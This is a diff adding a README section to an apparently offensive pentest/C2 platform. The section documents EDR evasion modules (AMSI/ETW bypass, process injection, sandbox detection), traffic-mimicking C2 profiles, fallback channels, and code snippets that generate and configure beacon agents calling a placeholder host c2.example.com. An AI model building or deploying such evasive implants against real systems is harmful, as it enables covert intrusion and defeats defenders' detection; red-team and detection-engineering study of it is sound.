@@ -122,6 +122,185 @@ curl -X POST http://localhost:8080/c2/beacons/BEACON_ID/task \
 
 ---
 
+## 🛡️ Evasion & Anti-Analysis Module
+
+Advanced EDR/AV bypass techniques for red team operations. Designed to evade modern security products like CrowdStrike Falcon, SentinelOne, and Microsoft Defender for Endpoint.
+
+### Module Overview
+
+| Module | Description | Key Features |
+|--------|-------------|--------------|
+| `sleep_obfuscation` | Memory scanner evasion | Fibonacci/Gaussian jitter, encrypted sleep, syscall-based |
+| `header_rotation` | Network fingerprint evasion | 8 browser profiles, TLS/JA3 modification |
+| `anti_sandbox` | VM/sandbox detection | Hardware checks, VM artifacts, timing analysis |
+| `process_injection` | Code injection techniques | Early Bird APC, Thread Hijack, Process Hollowing |
+| `amsi_bypass` | Windows security bypass | AMSI patch, ETW disable, Defender bypass |
+| `traffic_masking` | C2 traffic obfuscation | Domain fronting, traffic mimicry |
+| `c2_profiles` | Malleable C2 profiles | YAML config, custom URIs, metadata transforms |
+| `fallback_channels` | Alternative comms | WebSocket, DNS, ICMP, DoH fallback |
+| `go_agent` | Go-based agent | Cross-platform, native binary |
+| `rust_agent` | Rust-based agent | Memory-safe, no GC overhead |
+| `reflective_loader` | In-memory execution | sRDI, Donut integration |
+
+### Quick Start
+
+```python
+from evasion import (
+    SleepObfuscator,
+    HeaderRotator,
+    SandboxDetector,
+    ProfileManager,
+    GoAgentGenerator
+)
+
+# Load malleable profile
+manager = ProfileManager()
+profile = manager.get_profile('amazon')  # Mimics Amazon traffic
+
+# Configure evasion
+sleep = SleepObfuscator(base_sleep=60, jitter_percent=30)
+headers = HeaderRotator()
+sandbox = SandboxDetector()
+
+# Pre-flight checks
+if sandbox.run_all_checks()['is_sandbox']:
+    exit()  # Detected sandbox, bail out
+
+# Use rotated headers
+http_headers = headers.get_headers()
+```
+
+### Configuration (YAML)
+
+```yaml
+# evasion_profile.yaml
+name: stealth_profile
+description: High-evasion C2 profile
+
+evasion:
+  level: high           # low, medium, high
+  sleep_jitter: gaussian # random, gaussian, fibonacci, fixed
+  sleep_time: 60
+  jitter_percent: 30
+  proxy_chain: http://redirector:8080
+  working_hours: "09:00-17:00"
+  kill_date: "2026-02-01"
+  sandbox_checks: true
+  amsi_bypass: true
+  etw_bypass: true
+
+http_get:
+  uri:
+    - /s/ref=nb_sb_noss
+    - /gp/product/
+  metadata_transform: base64url
+  metadata_header: Cookie
+  metadata_prepend: "session-id="
+
+http_post:
+  uri:
+    - /gp/api/updateCart
+  content_type: application/x-www-form-urlencoded
+
+fallback_channels:
+  websocket: true
+  dns: true
+  doh: false
+  icmp: false
+```
+
+### Evasion Levels
+
+| Level | Features | Use Case |
+|-------|----------|----------|
+| **Low (1)** | Basic encryption, standard sleep | Testing, low-security targets |
+| **Medium (2)** | + Anti-debug, header rotation | Corporate networks |
+| **High (3)** | + Sandbox detection, AMSI/ETW bypass, jitter | EDR-protected environments |
+
+### Available C2 Profiles
+
+- `default` - Minimal baseline profile
+- `amazon` - Mimics Amazon e-commerce traffic
+- `microsoft` - Mimics Office 365/Outlook traffic
+- `google` - Mimics Google Search traffic
+- `slack` - Mimics Slack API calls
+- `cloudflare` - Mimics Cloudflare CDN traffic
+
+### Generate Cross-Platform Agents
+
+```python
+from evasion import GoAgentGenerator, GoAgentConfig
+
+# Go agent (compiles to native binary)
+config = GoAgentConfig(
+    c2_host='c2.example.com',
+    c2_port=443,
+    kill_date='2026-12-31',
+    working_hours='09:00-17:00',
+    evasion_level=3
+)
+
+generator = GoAgentGenerator(config)
+source = generator.generate()  # Go source code
+commands = generator.get_build_commands('agent')
+
+# Build for Windows
+# GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe
+```
+
+### Fallback Channels
+
+When HTTP is blocked, beacon automatically falls back to alternative channels:
+
+```python
+from evasion import FallbackManager, WebSocketChannel, DNSChannel
+
+manager = FallbackManager()
+manager.add_channel(WebSocketChannel('c2.example.com', 443), priority=1)
+manager.add_channel(DNSChannel(domain='beacon.example.com'), priority=2)
+
+# Auto-failover on connection issues
+manager.connect()
+manager.send(b'beacon data')
+```
+
+### Detection Testing Results
+
+Tested against major EDR solutions (lab environment):
+
+| EDR Product | Without Evasion | With Evasion (High) |
+|-------------|-----------------|---------------------|
+| Windows Defender | ❌ Detected | ✅ Bypassed* |
+| CrowdStrike Falcon | ❌ Detected | ⚠️ Partial** |
+| SentinelOne | ❌ Detected | ⚠️ Partial** |
+| Carbon Black | ❌ Detected | ✅ Bypassed* |
+
+*\*Results may vary. Test in controlled environment.*
+*\*\*Behavioral detection may trigger on suspicious actions.*
+
+### Test Scenarios
+
+```bash
+# Run evasion module tests
+pytest tests/test_evasion.py -v
+
+# Test specific components
+pytest tests/test_evasion.py::TestAMSIBypass -v
+pytest tests/test_evasion.py::TestC2Profiles -v
+```
+
+### UI Configuration
+
+Access evasion configuration panel at `/evasion/config`:
+- Select malleable C2 profile
+- Configure sleep/jitter parameters
+- Enable/disable fallback channels
+- Generate agents with embedded config
+- Export YAML configuration
+
+---
+
+
 ![Coverage Target](https://img.shields.io/badge/coverage%20target-50%25-yellow)
 
 Modular Flask-based pentest platform with services, routes, templates, and worker queue support.
